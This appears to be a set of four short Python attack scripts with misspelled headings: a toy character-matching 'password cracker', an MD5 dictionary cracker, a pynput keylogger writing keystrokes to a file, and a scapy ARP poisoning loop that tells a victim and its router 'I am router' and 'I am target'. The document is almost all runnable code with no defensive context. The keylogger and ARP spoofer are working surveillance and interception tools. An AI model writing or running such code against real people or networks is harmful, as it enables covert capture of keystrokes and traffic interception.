1) passworrd cracker
import random

# Character set for brute-force attack
list_of_chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

# Generate a random password
password = ""
for _ in range(random.randint(8, 16)):  # Realistic password length
    password += random.choice(list_of_chars)

def solve_password(word):
    attempted_password = ""
    attempts = 0  # Counter to count total attempts

    for character in word:
        for entry in list_of_chars:
            attempts += 1
            if character == entry:
                attempted_password += character
                break  # Move to the next character

    return attempted_password, attempts

# Crack the password
cracked_password, total_attempts = solve_password(password)

# Display results
print("Generated Password: ", password)
print("Cracked Password:   ", cracked_password)
print("Password Match: ", cracked_password == password)
print("Total Attempts: ", total_attempts)


2)password cracking dict
import hashlib

# Hashed password to crack (MD5 of 'password123')
target_hash = "482c811da5d5b4bc6d497ffa98491e38"

# Dictionary list (in memory)
wordlist = ["123456", "password", "letmein", "admin", "password123"]

found = False

for word in wordlist:
    hashed_word = hashlib.md5(word.encode()).hexdigest()
    
    if hashed_word == target_hash:
        print(f"[✔] Password found: {word}")
        found = True
        break

if not found:
    print("[✘] Password not found in the wordlist.")


3)keyloger
from pynput.keyboard import Listener

# Function to handle key presses
def on_press(key):
    try:
        # Check if the key is a regular character or a number
        if hasattr(key, 'char') and key.char is not None:
            with open("keylog.txt", "a") as log_file:
                log_file.write(key.char)
                print(key.char) 
        else:
            # Handle special keys
            with open("keylog.txt", "a") as log_file:
                log_file.write(f"[{key}]")  # Write special keys like enter, shift, etc.
    except Exception as e:
        print("Error:", e)

# Setting up the listener
with Listener(on_press=on_press) as listener:
    listener.join()


4)ARP poisoing

from scapy.all import ARP, Ether, send
import time

# Set your target IP and gateway IP
target_ip = "192.168.1.5"       # Victim
gateway_ip = "192.168.1.1"      # Router/Gateway

# MAC addresses (optional - can use ARP requests to get these dynamically)
target_mac = "AA:BB:CC:DD:EE:FF"
gateway_mac = "11:22:33:44:55:66"

# Create ARP response packets to poison the target and the gateway
def spoof(target_ip, spoof_ip, target_mac):
    arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(arp_response, verbose=False)

try:
    print("[*] Starting ARP spoofing... Press CTRL+C to stop.")
    while True:
        spoof(target_ip, gateway_ip, target_mac)  # Tell target "I am router"
        spoof(gateway_ip, target_ip, gateway_mac)  # Tell router "I am target"
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[!] Stopping ARP spoofing... Restoring network (not included here).")

